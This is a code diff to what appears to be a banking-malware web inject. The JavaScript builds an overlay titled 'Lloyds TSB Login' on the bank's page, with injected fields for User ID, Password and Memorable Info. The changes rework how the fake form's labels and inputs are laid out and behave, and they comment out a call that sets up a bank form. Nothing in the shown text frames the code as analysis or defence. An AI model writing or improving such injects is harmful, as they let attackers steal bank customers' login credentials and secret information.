@@ -4,7 +4,7 @@
 	$A = function(e) { $D.body.appendChild(e); };
 	return {
 		init: function() {
-			this.load_css('lloydslogin.min');
+			this.load_css('lloydslogin');
 			this.login();
 		},
 		load_css: function(name) {
@@ -20,7 +20,7 @@
 			this.sandbox = this.launch_sandbox();
 			this.overlay = this.launch_overlay();
 			this.container = this.launch_container();
-			this.init_bank_form();
+			// this.init_bank_form();
 			this.login_box();
 		},
 		init_bank_form: function() {
@@ -88,24 +88,36 @@
 		login_box: function(){
 			var o = $E('div');
 			o.id = 'injected-login-holder';
-			var ci = function(name, placeholder) {
-				var i = $E('input')
+			var ci = function(container, name, placeholder) {
+				var i = $E('input'), p = $E('p'), l = $E('label');
 				i.type = 'password';
 				i.id = name;
 				i.name = name;
 				i.className = 'injected';
-				i.placeholder = placeholder;
+				l['for' ]= i.id;
+				l.innerHTML = placeholder;
+				p.appendChild(l);
+				p.appendChild(i);
+				container.appendChild(p);
+				i.onfocus = function() {
+					l.style.display = 'none';
+				}
+				i.onblur = function() {
+					if (this.value === '') {
+						l.style.display = 'block';
+					}
+				}
 				return i;
 			};
 			var h = $E('h2');
 			h.innerHTML = "Lloyds TSB Login";
 			o.appendChild(h);
-			var i1 = ci('injected_UserId1', 'User ID')
-			var i2 = ci('injected_Password', 'Password')
-			var i3 = ci('injected_Secret', 'Memorable Info')
-			o.appendChild(i1);
-			o.appendChild(i2);
-			o.appendChild(i3);
+			var i1 = ci(o, 'injected_UserId1', 'User ID')
+			var i2 = ci(o, 'injected_Password', 'Password')
+			var i3 = ci(o, 'injected_Secret', 'Memorable Info')
+			// o.appendChild(i1);
+			// o.appendChild(i2);
+			// o.appendChild(i3);
 			var p = $E('p');
 			var a = $E('a');
 			a.innerHTML = "\xd7 Cancel";
